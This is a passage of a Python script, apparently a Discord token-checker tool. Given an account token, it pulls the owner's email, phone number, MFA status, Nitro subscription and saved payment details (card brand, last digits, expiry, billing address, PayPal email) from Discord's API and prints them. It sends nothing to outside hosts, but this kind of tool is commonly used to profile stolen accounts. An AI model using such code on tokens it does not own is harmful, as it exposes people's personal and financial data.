            # user info
            res_json = res.json()

            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
            user_id = res_json['id']
            avatar_id = res_json['avatar']
            avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
            phone_number = res_json['phone']
            email = res_json['email']
            mfa_enabled = res_json['mfa_enabled']
            flags = res_json['flags']
            locale = res_json['locale']
            verified = res_json['verified']

            language = languages.get(locale)

            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')

            has_nitro = False
            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
            nitro_data = res.json()
            has_nitro = bool(len(nitro_data) > 0)
            if has_nitro:
                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                days_left = abs((d2 - d1).days)

            # billing info
            billing_info = []
            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',
                                  headers=headers).json():
                y = x['billing_address']
                name = y['name']
                address_1 = y['line_1']
                address_2 = y['line_2']
                city = y['city']
                postal_code = y['postal_code']
                state = y['state']
                country = y['country']

                if x['type'] == 1:
                    cc_brand = x['brand']
                    cc_first = cc_digits.get(cc_brand)
                    cc_last = x['last_4']
                    cc_month = str(x['expires_month'])
                    cc_year = str(x['expires_year'])

                    data = {
                        'Payment Type': 'Credit Card',
                        'Valid': not x['invalid'],
                        'CC Holder Name': name,
                        'CC Brand': cc_brand.title(),
                        'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate(
                            (cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                        'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[
                                                                                                         2:4],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment Method': x['default']
                    }

                elif x['type'] == 2:
                    data = {
                        'Payment Type': 'PayPal',
                        'Valid': not x['invalid'],
                        'PayPal Name': name,
                        'PayPal Email': x['email'],
                        'Address 1': address_1,
                        'Address 2': address_2 if address_2 else '',
                        'City': city,
                        'Postal Code': postal_code,
                        'State': state if state else '',
                        'Country': country,
                        'Default Payment Method': x['default']
                    }

                billing_info.append(data)

            Write.Print("Basic İnformation\n", Colors.green_to_white, interval=0.003)
            Write.Print("-----------------\n", Colors.green_to_white, interval=0.003)
            Write.Print(f"    Username               {user_name}\n", Colors.green_to_white, interval=0.003)
            Write.Print(f"    User Id               {user_id}\n", Colors.green_to_white, interval=0.003)
            Write.Print(f"    Creation Date               {creation_date}\n", Colors.green_to_white, interval=0.003)
            Write.Print(f'    Avatar URL             {avatar_url if avatar_id else ""}\n', Colors.green_to_white, interval=0.003)
            Write.Print(f"    Token              {token}\n", Colors.green_to_white, interval=0.003)
            Write.Print("", Colors.green_to_white, interval=0.07)

            Write.Print('Nitro Information\n', Colors.green_to_white, interval=0.003)
            Write.Print('-----------------\n', Colors.green_to_white, interval=0.003)
            Write.Print(f'    Nitro Status           {has_nitro}\n', Colors.green_to_white, interval=0.003)
            if has_nitro:
                Write.print(f'    Expires in             {days_left} day(s)\n', Colors.green_to_white, interval=0.003)
            Write.Print('\n', Fore.RESET)

            Write.Print('Contact Information\n', Colors.green_to_white, interval=0.003)
            Write.Print('-------------------\n', Colors.green_to_white, interval=0.003)
            Write.Print(f'    Phone Number           {phone_number if phone_number else ""}\n', Colors.green_to_white, interval=0.003)
            Write.Print(f'    Email                  {email if email else ""}\n', Colors.green_to_white, interval=0.003)
            Write.Print('\n', Fore.RESET)


            if len(billing_info) > 0:
                Write.Print('Billing Information\n', Colors.green_to_white, interval=0.003)
                Write.Print('-------------------\n', Colors.green_to_white, interval=0.003)
                if len(billing_info) == 1:
                    for x in billing_info:
                        for key, val in x.items():
                            if not val:
                                continue
                            Write.print(f'    {key:<23}{val}\n', Fore.CYAN)
                else:
                    for i, x in enumerate(billing_info):
                        title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                        Write.print(f'    {title}\n', Fore.RESET)
                        Write.print(f'    {"=" * len(title)}\n', Fore.RESET)
                        for j, (key, val) in enumerate(x.items()):
                            if not val or j == 0:
                                continue
                            Write.print(f'        {key:<23}{val}\n', Fore.CYAN)
                        if i < len(billing_info) - 1:
                            Write.print('\n', Fore.RESET)
                Write.print('\n', Fore.RESET)

            Write.Print('Account Security\n', Colors.green_to_white, interval=0.003)
            Write.Print('----------------\n', Colors.green_to_white, interval=0.003)
            Write.Print(f'    2FA/MFA Enabled        {mfa_enabled}\n', Colors.green_to_white, interval=0.003)
            Write.Print(f'    Flags                  {flags}\n', Colors.green_to_white, interval=0.003)
            Write.Print('\n', Fore.RESET)

            Write.Print('Other\n', Colors.green_to_white, interval=0.003)
            Write.Print('-----\n', Colors.green_to_white, interval=0.003)
            Write.Print(f'    Locale                 {locale} ({language})\n', Colors.green_to_white, interval=0.003)
            Write.Print(f'    Email Verified         {verified}\n', Colors.green_to_white, interval=0.003)
            Write.Input("[+] Press Enter to continue...", Colors.green_to_white, interval=0.03) 
            print()
    

        elif res.status_code == 401:  # code 401 if invalid
            Write.Print('[-] Invalid token\n', Colors.green_to_white, interval=0.003)

        else:
            Write.Print('[-] An error occurred while sending request\n', Colors.green_to_white, interval=0.003)
    except Exception as e:
        Write.Print(f'[-] An error occurred while getting request: {str(e)}\n', Colors.green_to_white, interval=0.003)



if __name__ == "__main__":
    main_menu()
